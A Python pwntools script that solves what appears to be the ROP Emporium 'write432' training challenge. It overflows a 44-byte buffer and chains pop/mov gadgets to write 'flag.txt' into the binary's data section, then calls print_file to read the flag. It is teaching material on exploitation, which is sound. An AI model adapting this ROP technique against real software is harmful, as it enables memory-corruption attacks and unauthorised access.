#!/usr/bin/env python3

from pwn import *

exe = ELF("write432_patched")
libc = ELF("libwrite432.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 44
    printfile = 0x08048538
    movgad = 0x08048543
    popgad = 0x080485aa
    datasec = 0x0804a018
    payload = flat(b'A'*offset, popgad, datasec, b'flag', movgad, popgad, datasec + 4, b'.txt', movgad, printfile, datasec)

    r.sendlineafter(b'>', payload)
    r.recvline()
    flag = r.recvline()
    print(flag)


if __name__ == "__main__":
    main()
